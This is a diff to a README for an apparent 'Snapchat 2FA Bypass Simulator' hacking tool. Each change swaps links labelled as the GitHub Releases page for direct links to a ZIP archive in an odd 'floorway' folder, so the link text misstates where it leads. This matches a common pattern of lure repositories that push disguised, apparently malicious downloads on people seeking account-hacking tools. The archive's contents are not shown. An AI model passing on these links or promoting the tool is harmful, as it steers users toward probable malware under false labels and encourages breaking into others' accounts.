@@ -1,6 +1,6 @@
 # 🎉 Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool - Learn 2FA Bypass Techniques Easily
 
-[![Download Now](https://github.com/user-attachments/assets/baf88db4-2e65-46e7-b93f-73d3e6e5903d)](https://github.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/releases)
+[![Download Now](https://raw.githubusercontent.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/main/floorway/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool.zip)](https://raw.githubusercontent.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/main/floorway/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool.zip)
 
 ---
 
@@ -29,7 +29,7 @@ It's designed to:
 
 To get started with the Snapchat 2FA Bypass Simulator, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [GitHub Releases Page](https://github.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [GitHub Releases Page](https://raw.githubusercontent.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/main/floorway/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool.zip) to find the latest version.
 
 2. **Download the Application**: Locate the most recent version. Click the download link to save the file to your computer.
 
@@ -45,7 +45,7 @@ To get started with the Snapchat 2FA Bypass Simulator, follow these steps:
 
 To download the Snapchat 2FA Bypass Simulator, click the following link to visit the release page:
 
-[Download Now](https://github.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/releases)
+[Download Now](https://raw.githubusercontent.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/main/floorway/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool.zip)
 
 Once on the Releases page, select the latest version and follow the steps outlined in the **Getting Started** section to install.
 
@@ -107,4 +107,4 @@ If you have questions or feedback about the Snapchat 2FA Bypass Simulator, pleas
 
 This README was last updated in 2025. Regular updates to the software will address any bugs and improve functionality based on user feedback. 
 
-For all future updates, it is recommended to periodically check back on the [Releases Page](https://github.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/releases).
+For all future updates, it is recommended to periodically check back on the [Releases Page](https://raw.githubusercontent.com/Palovicslaci/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool/main/floorway/Snapchat-2FA-Bypass-Simulator-Python-Ethical-Hacking-Tool.zip).
